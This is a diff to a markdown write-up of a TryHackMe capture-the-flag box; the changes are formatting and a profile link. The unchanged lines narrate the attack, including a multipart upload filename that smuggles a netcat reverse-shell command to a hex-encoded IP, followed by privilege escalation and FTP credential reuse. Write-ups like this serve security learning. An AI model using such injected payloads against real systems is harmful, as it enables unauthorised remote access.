@@ -144,7 +144,7 @@ I tried the netcat mkfifo method but the server responds that the filename was w
 Content-Disposition: form-data; name="file"; filename="a.txt;nc 0xC0A89049 9001 -e sh"
 ```
 
-In this case I had to transform my IP to hex in order to cut a few characters off and rename my valid file to a.txt. After that is taken care off, we get a successful shell on the server as www. Let's start looking for ways to escalate privileges to root as there are no other users on the system. I also upgrade my shell using the typical python3 -c import pty method.
+In this case I had to transform my IP to hex in order to cut a few characters off and rename my valid file to a.txt. After that is taken care off, we get a successful shell on the server as `www`. Let's start looking for ways to escalate privileges to root as there are no other users on the system. I also upgrade my shell using the typical python3 -c import pty method.
 
 I begin with some manual enumeration on any writable files for our current user and any SUID bits set for valuable files but don't find anything. A quick check in the `/` dir shows a `.dockerenv` file meaning we're in a Docker container.
 
@@ -257,7 +257,7 @@ The `/admin` dir looks interesting especially because we have credentials for an
 ![](../assets/img/2026-01-27-TempusFugitDurius/21.png)
 
 ## DNS records
-Looking at the DNS zone transfer contents displays two other subdomains with CNAME records. I doubt www has one because it is exposed to the web and we already enumerated ftp, so let's check out `newcms.mofo.pwn`.
+Looking at the DNS zone transfer contents displays two other subdomains with CNAME records. I doubt `www` has one because it is exposed to the web and we already enumerated ftp, so let's check out `newcms.mofo.pwn`.
 
 I add those domains to my /etc/hosts file and continue on. I navigate to /admin and find a login panel at last. Using the credentials found while enumerating FTP grants us a successful logon and we can have a look around.
 
@@ -304,4 +304,4 @@ Switching users will grant us root access on the box and we can grab that final 
 
 That's all folks; this box itself was pretty fun as a whole but I had heaps of problems getting a solid connection while port forwarding and had to reset the machine more than once. Either way I really liked the concept of enumerating the subdomain to find another host. 
 
-Thanks to 4ndr34z for creating yet another great box to pwn. I hope this was helpful to anyone following along and happy hacking!
+Thanks to [4ndr34z](https://tryhackme.com/p/4ndr34z) for creating yet another great box to pwn. I hope this was helpful to anyone following along and happy hacking!
